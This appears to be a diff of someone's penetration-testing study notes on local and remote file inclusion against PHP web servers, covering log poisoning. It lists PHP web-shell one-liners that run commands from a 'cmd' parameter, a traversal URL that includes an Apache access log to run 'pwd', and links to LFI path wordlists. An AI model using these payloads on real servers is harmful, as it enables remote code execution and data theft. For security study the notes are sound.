@@ -1,12 +1,26 @@
 LFI Attack is Local File Inclusion Attack. It's mainly talking about how to use local file on server to do further attack, contains disclose sensitive info
-or RCE.
+or RCE. RFI is Remote File Inclusion Attacker. It's mainly taking about how to use remote file located on itself host to do further attack. And this attack is
+mainly focus on PHP web server.
 
-RFI is Remote File Inclusion Attacker. It's mainly taking about how to use remote file located on itself host to do further attack.
+1.LFI Form-Log Poisoning:
+Finding the vulnerability log, then implement malicious code into this log and get sensitive info or RCE.
+*The common malicious code: 
+<?php system($_GET[1]); ?> 
+<?php system($_GET[2]); ?>
+<?php system($_GET[3]); ?>
+<?php system($_GET['cmd']); ?>
+<?php echo system($_GET['cmd']); ?>
 
-1.LFI Attacker Form:
+After implementing, we could do below attack:
+<URL>?../../../../../{vulnerability log path and name}
 
-1-1.Uploading malicious file:
-We could upload malicious file on target server.Then, do below attack:
-{URL}?../../../../../{malicious file name}---->This attacker is also called "File Uploading Attack"
 
-1-2.Log Poisoning:
+2.If u want to implement above malicious code into '/var/log/apache2/access.log, u could use BurpSuite to do it.
+(Please refer to LFI&RFI Burpsuite.md)
+
+After implementing, u coud do below attack: 
+http://192.x.x.x/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=pwd
+
+3.The vulnerability file lists for LFI:
+*Linux:https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux
+*Windows:https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e
